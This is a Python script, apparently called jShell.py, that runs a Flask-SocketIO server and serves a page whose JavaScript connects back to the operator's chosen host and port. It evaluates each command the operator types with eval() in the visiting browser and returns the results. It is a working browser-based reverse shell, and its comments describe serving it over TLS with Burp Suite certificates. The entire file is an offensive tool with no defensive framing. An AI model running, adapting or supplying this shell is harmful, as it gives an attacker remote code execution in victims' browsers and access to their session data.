#!/usr/bin/env python3
from flask_socketio import SocketIO,emit
from flask import Flask
import sys
import logging

#Export DER cert and private key from Burp Suite.
#openssl rsa -inform der -in burp-key.der -out key.pem
#openssl x509 -inform der -in cacert.der -out certificate.pem

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

if len(sys.argv)<3:
    print("Usage : python jShell.py IpAddress Port\nExample: python jsHell.py 192.168.0.1 8080")
    exit()

PORT=sys.argv[2].strip()
HOST=sys.argv[1].strip()

print("Listening on",HOST+":"+PORT)

app = Flask(__name__)
app.secret_key='I Am Batman.'
access_key="Tony Stark."
session_id="You are best!"
socketio = SocketIO(app,cors_allowed_origins='*')

html='''
<div id=history></div>
<script src="https://cdn.socket.io/4.4.1/socket.io.min.js"></script>

<script>
'''
html=html+"var socket = io.connect('http://{}:{}');".format(HOST,PORT)

html=html+'''
    try{setTimeout(`
            socket.emit('sendMSG','Connection Established.')
        `,1000)
     }

    catch{}

    socket.on('getMSG',function(data){
        document.getElementById("history").innerHTML+="<br><font size=3 color=black> ["+data.replace(/</g,"")+"]</font>";
        try{
             output=eval(data)+""
        }
        catch(e){
            output=e+""
        }
        socket.emit('sendMSG',output)
    })
</script>
'''

@app.route('/',methods = ['GET'])
def shell():
    return html

@socketio.on('sendMSG')
def sendMSG(message): #Get MSG from Client
    print("OUTPUT> "+str(message))
    command=input("CMD> ")
    emit("getMSG",command+"\n")
    if command=="exit":
        exit()

if __name__ == '__main__':
   context = ('certificate.pem','key.pem')
   socketio.run(app,host=HOST,port=int(PORT),ssl_context=context)
